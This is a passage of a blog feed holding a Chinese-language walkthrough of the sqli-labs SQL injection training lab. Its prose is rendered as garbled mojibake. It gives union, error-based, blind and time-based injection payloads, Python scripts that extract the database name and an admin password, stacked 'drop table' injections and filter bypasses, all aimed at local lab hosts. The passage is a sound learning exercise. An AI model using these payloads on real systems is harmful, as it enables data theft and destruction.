      <link href="/sqli-labs-training-3.html"/>
      <url>/sqli-labs-training-3.html</url>
      <content type="html"><![CDATA[<h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><p>ä»è¿™ä¸€å…³å¼€å§‹å…¶å®å°±æ˜¯å †å æ³¨å…¥ï¼Œå°±æ˜¯ç”¨åˆ†å·è¿æ¥ä¸¤ä¸ªä¸åŒçš„è¯­å¥ï¼Œç„¶åæ‰§è¡Œè¿™å‡ æ¡è¯­å¥ï¼Œè¿›è¡Œå¢åˆ æ”¹æŸ¥ï¼Œ<a id="more"></a>ä½†æ˜¯æ¯”èµ›ä¸­æ˜¯ä¸å¤§ä¼šç”¨çš„ï¼Œä½†æ˜¯å¯¹äºè¿™å‡ ä¸ªç¯å¢ƒæˆ‘è¿˜æ˜¯åå‘unionæ³¨å…¥æ‰€ä»¥æˆ‘è¿˜æ˜¯ä»¥unionæ³¨å…¥çš„æ–¹å¼æ˜¾ç¤º</p><p>æ¢äº†mysqliçš„è¿æ¥æ–¹å¼ï¼Œä½†æ˜¯æ¢æ±¤ä¸æ¢è¯<br>ç›´æ¥å•å¼•å·é—­åˆå°±å¥½äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-38/?id=-1&apos; union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>æŠ¥é”™å°è¯•ä¸€ä¸‹ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-38/?id=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h3><p>è¿™ä¸ªé¢˜ç›´æ¥æ³¨é‡Šæ‰åé¢çš„éƒ¨åˆ†å°±å¥½äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-39/?id=-1 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h3 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h3><p>æ™®é€šçš„unionæ³¨å…¥å°±å¯ä»¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-40/?id=1234&apos;) union select 1,2,3%23</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥å°è¯•ä¸€ä¸‹ç›²æ³¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-40/?id=1&apos;) and ascii(substr(database(),1,1))&gt;114 %23</span><br></pre></td></tr></table></figure><h3 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h3><p>unionæ³¨å…¥ä¹Ÿå¯ä»¥ï¼Œç›²æ³¨ä¹Ÿå¯ä»¥<br>unionæ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-41/?id=-1 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>ç›²æ³¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-41/?id=1 and ascii(substr(database(),1,1))&gt;114 %23</span><br></pre></td></tr></table></figure><h3 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h3><p>è¿™ä¸ªé¢˜ç›®æŸ¥çœ‹æºç ä½ ä¼šå‘ç°ç™»é™†é¡µé¢çš„passwordæ˜¯æ²¡æœ‰è¿‡æ»¤å¥½çš„ï¼Œæˆ‘ä¹ˆå¯ä»¥åˆ©ç”¨æ­¤å¤„è¿›è¡Œå †å æ³¨å…¥å¢åŠ ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ç‚¹ç›´æ¥åˆ åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname = 0ver</span><br><span class="line">passwd = 123;drop table 0ver#</span><br></pre></td></tr></table></figure><h3 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h3><p>è·Ÿä¸Šä¸€é¢˜ä¸€æ ·passwordæ²¡æœ‰è¿‡æ»¤<br>åªæ˜¯æŸ¥è¯¢çš„è¯­å¥æ”¹å˜äº†ï¼Œæˆ‘ä¹ˆéœ€è¦é—­åˆæ‹¬å·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname = 0ver</span><br><span class="line">passwd = 123&apos;);drop table 0ver#</span><br></pre></td></tr></table></figure><h3 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h3><p>è·Ÿä¸Šä¸€é¢˜åŒæ ·çš„æ€è·¯ï¼Œåªæ˜¯éœ€è¦å•å¼•å·é—­åˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname = 0ver</span><br><span class="line">passwd = 123&apos;;drop table 0ver#</span><br></pre></td></tr></table></figure><h3 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h3><p>æ„Ÿè§‰è·Ÿ43é¢˜æ²¡å•¥åŒºåˆ«å•Šã€‚ã€‚ã€‚</p><h3 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h3><p>ä»è¿™ä¸€å…³å¼€å§‹æ­£å¼è¿›å…¥order byæ³¨å…¥<br>æŸ¥çœ‹ä¸€ä¸‹æºç è¯­å¥æ˜¯è¿™æ ·çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM users ORDER BY $id"</span>;</span><br></pre></td></tr></table></figure><p>order byåˆ©ç”¨çš„ä¸‰ç§æ–¹å¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1ã€ç›´æ¥æ·»åŠ æ³¨å…¥è¯­å¥ ?sort=(select ******)</span><br><span class="line">2ã€åˆ©ç”¨ä¸€äº›å‡½æ•°ï¼Œä¾‹å¦‚randå‡½æ•°ï¼Œ?sort=rand(sqlè¯­å¥)ï¼Œè€Œä¸”æ­¤å¤„rand(true)å’Œrand(false)æ˜¯ä¸ç›¸åŒçš„ã€‚</span><br><span class="line">3ã€åˆ©ç”¨andï¼Œä¾‹å¦‚?sort=1 and (åŠ sqlè¯­å¥)</span><br></pre></td></tr></table></figure><p>è¿™ä¸€é¢˜ç›®å¯ä»¥ç›´å€Ÿç”¨æŠ¥é”™æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-46/?sort=rand(updatexml(1,concat(0x7e,database(),0x7e),1))</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç”¨ç›²æ³¨ï¼Œåˆ©ç”¨è¡¨æ ¼æœ€åä¸€è¡Œå»åŒºåˆ†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.105/sqlilabs/Less-46/?sort=rand(ascii(substr((select database()),&#123;_&#125;,1))&gt;&#123;__&#125;)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Min+Max)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'&lt;td&gt;superman&lt;/td&gt;&lt;td&gt;genious&lt;/td&gt;&lt;/tr&gt;&lt;/font&gt;&lt;/table&gt;'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h3><p>è¿™ä¸€æ¬¡çš„order byæ³¨å…¥éœ€è¦é—­åˆå•å¼•å·<br>æ¥ä¸ªæŠ¥é”™æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-47/?sort=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h3><p>è·Ÿ46é¢˜ä¸€æ ·çš„ç›²æ³¨ã€‚</p><h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h3><p>ä¸€ç›´åœ¨å°è¯•ä¸‹é¢è¿™ä¸¤å¥è¯ï¼Œå‘ç°ä¸€ç›´æ²¡æ•ˆæœï¼Œå¥‡äº†æ€ªï¼Œè‡ªæˆ‘æ„Ÿè§‰æ²¡é—®é¢˜ã€‚ã€‚ã€‚ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-49/?sort=1&apos; and rand(ascii(substr((select database()),1,1))&gt;127)%23</span><br><span class="line">http://localhost/sql/Less-49/?sort=1&apos; and ascii(substr((select database()),1,1))&gt;1%23</span><br></pre></td></tr></table></figure><p>å†æ¥å°è¯•ä¸€ä¸‹æ—¶é—´ç›²æ³¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.105/sqlilabs/Less-49/?sort=1' and if(((ascii(substr((select password from users where username="admin"),&#123;_&#125;,1)))=&#123;__&#125;),sleep(4),false) --+'''</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">67</span>,<span class="number">127</span>):</span><br><span class="line">        payload = url.format(_=i,__=j)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(payload,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥å‡ºæ¥ç»“æœï¼Œè¿™å°¼ç›ä»€ä¹ˆæ“ä½œã€‚ã€‚</p><h3 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h3><p>è¿™å¯ä»¥ç›´æ¥æŠ¥é”™æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-50?sort=1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure><h3 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h3><p>å•å¼•å·é—­åˆæŠ¥é”™æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-51?sort=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h3><p>åŒæ ·ç›´æ¥ç›²æ³¨æˆ–è€…æ—¶é—´ç›²æ³¨éƒ½è¡Œï¼Œä¸éœ€è¦å•å¼•å·é—­åˆæ²¡ä»€ä¹ˆæ„ä¹‰</p><h3 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h3><p>åˆæ˜¯ä¸€é“å•å¼•å·é—­åˆçš„é¢˜ç›®ï¼Œç›´æ¥æ—¶é—´ç›²æ³¨å°±å¯ä»¥å‡ºæ¥å‚è€ƒLess-49çš„è„šæœ¬</p><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>è¿™ä¸€éƒ¨åˆ†çš„é¢˜ç›®è®©æˆ‘äº†è§£åˆ°æ€ä¹ˆå¯¹ä»˜order byæ³¨å…¥ï¼Œå¾ˆæœ‰æ„ä¹‰ï¼Œä¸ªäººæœ€å–œæ¬¢è¿˜æ˜¯ç”¨randå‡½æ•°çš„é‚£ç§åŠæ³•<br>ä½†å‰é¢çš„å †å æ³¨å…¥å°±æ„Ÿè§‰æ„ä¹‰ä¸å¤§ã€‚ã€‚ã€‚ã€‚</p>]]></content>
      
      <categories>
          
          <category> SQLæ³¨å…¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labså®æˆ˜è®°å½•(äºŒ)</title>
      <link href="/sqli-labs-training-2.html"/>
      <url>/sqli-labs-training-2.html</url>
      <content type="html"><![CDATA[<h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><p>ä»è¿™é‡Œå¼€å§‹åº”è¯¥æ˜¯æœ‰åšäº†é˜²æŠ¤ï¼Œæˆ‘ä»¬å¯ä»¥è¾¹çœ‹æºä»£ç ç»ƒä¹ ä»£ç å®¡è®¡ï¼Œä¸€è¾¹å­¦ä¹ å„ç§è¿‡wafçš„æŠ€å·§äº†<a id="more"></a><br>è¿™ä¸€é¢˜æŸ¥çœ‹æºä»£ç çš„è¯å‘ç°æ³¨é‡Šç¬¦è¢«è¿‡æ»¤æ‰äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$reg = <span class="string">"/#/"</span>;</span><br><span class="line">$reg1 = <span class="string">"/--/"</span>;</span><br><span class="line">$replace = <span class="string">""</span>;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br></pre></td></tr></table></figure><p>ä½†å…¶å®å¯¹äºè¿™ä¸€å¥SQLè¯­å¥ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å•å¼•å·é—­åˆè€Œä¸ç”¨æ³¨é‡Šå»æŠŠåé¢çš„ä¸œè¥¿ç»™çœç•¥æ‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-23/?id=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>ç›´æ¥æŠ¥å‡ºæ•°æ®åº“ï¼Œæ­¤é¢˜å®Œç»“</p><h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><p>è¿™ä¸€é¢˜åº”è¯¥æ˜¯è®¾è®¡äºŒæ¬¡æ³¨å…¥çš„é¢˜ç›®<br>åœ¨CTFé¢˜ç›®é‡Œé¢çš„è¯è‚¯å®šæ˜¯è¦ä½ è·å–adminçš„è´¦å·ç„¶åæ”¹å˜adminçš„å¯†ç ç”¨adminè´¦å·ç™»å½•è·å–flag<br>è¿™é‡Œä¸»è¦å…³é”®æ˜¯pass_change.phpè¿™é‡Œé¢çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span></span><br></pre></td></tr></table></figure><p>è‹¥æˆ‘ä»¬åœ¨ä¿®æ”¹å¯†ç çš„æ—¶å€™<br>æ³¨å†Œä¸€ä¸ª<code>adminâ€™#</code>çš„ç”¨æˆ·å°±æ˜¯ä¸ºäº†åæœŸèƒ½å¤Ÿä½¿è¿™ä¸€å¥è¯åé¢çš„å†…å®¹å…¨éƒ½æ³¨é‡Šçš„ï¼Œä»è€Œç›´æ¥æ›´æ–°çš„æ˜¯<code>admin</code>çš„ç”¨æˆ·å<br>è¿™æ—¶å€™çš„è¯­å¥å°±ä¼šå˜æˆ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=<span class="string">'$pass'</span> where username=<span class="string">'admin'</span></span><br></pre></td></tr></table></figure><p>æ”¹ä½ æƒ³è¦å¯†ç ï¼Œç„¶åé€€å‡ºåœ¨ç›´æ¥ç”¨adminç™»å½•å°±å¥½</p><h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h3><p>è¿™ä¸€é¢˜çœ‹æºä»£ç ä¼šå‘ç°æœ‰ä¸€ä¸ªé»‘åå•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠŠorè¿˜æœ‰ANDéƒ½ä¼šæ›¿æ¢æˆä¸º<code>&quot;&quot;</code>ï¼Œè¿™é‡Œæ˜¯å¤§å°å†™éƒ½ä¼šè¢«æ‹¦æˆªä¸‹æ¥çš„<br>è¿™æ—¶å€™å…¶å®å¯ä»¥æœ‰å‡ ä¸ªåŠæ³•èƒ½å¤Ÿç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆ1ï¼‰å¤§å°å†™å˜å½¢Or,OR,oR</span><br><span class="line">ï¼ˆ2ï¼‰ç¼–ç ï¼Œhexï¼Œurlencode</span><br><span class="line">ï¼ˆ3ï¼‰æ·»åŠ æ³¨é‡Š/*or*/</span><br><span class="line">ï¼ˆ4ï¼‰åˆ©ç”¨ç¬¦å·and=&amp;&amp; or=||</span><br><span class="line">ï¼ˆ5ï¼‰åŒå†™ç»•è¿‡</span><br></pre></td></tr></table></figure><p>è¾“å…¥ä¸€ä¸ªå•å¼•å·ä¼šå‡ºç°å•å¼•å·çš„æŠ¥é”™ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•é—­åˆä¸€ä¸‹<br><code>http://127.0.0.1/sqlilabs/Less-25/?id=1%27 %23</code> æˆåŠŸå‡ºç°å›æ˜¾ </p><p>æˆ‘è¿™é‡Œé€‰æ‹©ç”¨åŒå†™ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-25/?id=1&apos; aandnd updatexml(1,concat(0x7e,database(),0x7e),1) %23</span><br></pre></td></tr></table></figure><p>ç¬¦å·ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-25/?id=1&apos; || updatexml(1,concat(0x7e,database(),0x7e),1) %23</span><br></pre></td></tr></table></figure><h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><p>è·Ÿä¸Šé¢ä¸€é¢˜åŒæ ·çš„è¿‡æ»¤æ–¹å¼ï¼Œè¯­å¥å˜ç®€å•äº†ï¼Œä¸ç”¨å•å¼•å·å»é—­åˆ<br>ä½†æ˜¯è¿™ä¸€é¢˜ä¸èƒ½å†ç”¨æŠ¥é”™æ³¨å…¥ï¼Œå› ä¸ºæºç ä¸­æŠŠæŠ¥é”™ä¿¡æ¯ç»™æ³¨é‡Šæ‰äº†ï¼Œå¯ä»¥ç”¨ç›²æ³¨ï¼Œæˆ‘ä»¬éœ€è¦ç”¨çš„æ˜¯unionæ³¨å…¥æˆ–è€…æ˜¯ç›²æ³¨<br>unionæ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-25a/?id=-1 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>å†æ¥ä¸€ä¸ªäºŒåˆ†æ³•ç›²æ³¨ï¼Œé€šè¿‡æ³¨å…¥æˆåŠŸè¿˜ä¼šæ˜¾ç¤ºç™»å½•åè¿™ä¸ªæ ‡å¿—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://127.0.0.1/sqlilabs/Less-25a/?id=1 aandnd ascii(substr(database(),&#123;_&#125;,1))&gt;&#123;__&#125;%23'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max =<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Max+Min)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><p>æ³¨æ„ ä¸Šé¢è¿™ä¸¤å…³åœ¨å†™åˆ°å…³äºinformationè¿™ä¸ªå•è¯çš„æ—¶å€™ï¼Œéœ€è¦æ³¨æ„å®ƒé‡Œé¢å­˜åœ¨orï¼Œæˆ‘ä»¬éœ€è¦åŒå†™ç»•è¿‡</p><h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h3><p>è¾“å…¥?id=â€™ä¼šå‡ºç°å•å¼•å·çš„æŠ¥é”™<br>ä½†æ˜¯æƒ³ç”¨æ³¨é‡Šç¬¦å»é—­åˆå‘ç°æ²¡æ•ˆæœï¼Œå†ç”¨<code>?id=1&#39; or &#39;1&#39;=&#39;1</code>å»å°è¯•å‘ç°å›æ˜¾æˆåŠŸï¼Œè¿™æœ‰å¯èƒ½å°±æ˜¯æ³¨é‡Šç¬¦è¢«è¿‡æ»¤äº†<br>çœ‹çœ‹æºä»£ç ï¼Œæœç„¶é»‘åå•è¢«è¿‡æ»¤äº†ï¼Œç©ºæ ¼ä¹Ÿè¢«è¿‡æ»¤äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out --</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out #</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out spaces</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out slashes</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ²¡å…³ç³»ï¼Œè¿™æ ·æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œè¿™é‡Œç©ºæ ¼è¦æƒ³ç»•è¿‡çš„è¯ä¸èƒ½å¤Ÿç”¨æ³¨é‡Šäº†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code>%a0</code>ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨æ— ç©ºæ ¼æŠ¥é”™æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-26/?id=1&apos; ||updatexml(1,concat(0x7e,database(),0x7e),1)||&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>ç”¨%a0ä¹Ÿå¯ä»¥æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-26/?id=1&apos;%a0anandd%a0updatexml(1,concat(0x7e,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.TABLES</span><br><span class="line">%a0where%a0TABLE_SCHEMA=database()),0x7e),1)%a0anandd%0a&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>æ­¤å¤„æˆ‘ä»¬éœ€è¦è¯´æ˜ä¸¤æ–¹é¢ï¼šå¯¹äº<code>æ³¨é‡Š</code>å’Œç»“å°¾å­—ç¬¦çš„æˆ‘ä»¬æ­¤å¤„åªèƒ½åˆ©ç”¨<br>æ„é€ ä¸€ä¸ª<code>â€™</code> æ¥é—­åˆåé¢åˆ°<code>â€™</code> ï¼›<br>å¯¹äºç©ºæ ¼ï¼Œæœ‰è¾ƒå¤šçš„æ–¹æ³•<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%09 TAB é”®ï¼ˆæ°´å¹³ï¼‰</span><br><span class="line">%0a 